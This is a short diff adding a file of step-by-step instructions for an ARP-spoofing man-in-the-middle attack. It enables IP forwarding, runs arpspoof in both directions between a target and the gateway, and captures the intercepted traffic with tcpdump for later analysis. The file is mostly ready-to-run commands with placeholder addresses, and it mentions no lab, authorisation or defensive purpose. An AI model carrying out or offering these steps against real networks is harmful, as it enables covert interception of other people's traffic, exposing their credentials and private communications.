@@ -1,0 +1,25 @@
+
+
+Step 1: Enable IP forwarding:
+
+sudo sysctl -w net.ipv4.ip_forward=1
+
+
+Step 2: Identify the target's IP address and the gateway's IP address. You can use the `ip` command or other network scanning tools to find this information.
+
+Step 3: Use `arpspoof` from the `dsniff` package to perform ARP spoofing:
+
+sudo arpspoof -i <your_network_interface> -t <target_ip> <gateway_ip>
+
+
+Step 4: Open a new terminal window and perform ARP spoofing in the reverse direction to intercept traffic from the target to the gateway:
+
+sudo arpspoof -i <your_network_interface> -t <gateway_ip> <target_ip>
+
+
+Step 5: To capture the intercepted traffic, you can use a packet sniffer like `tcpdump` or `Wireshark`. In a new terminal window, run the following command to capture all traffic on the network interface:
+
+sudo tcpdump -i <your_network_interface> -w captured_traffic.pcap
+
+
+Step 6: Analyze the captured traffic using Wireshark or any other packet analysis tool to observe the intercepted data.
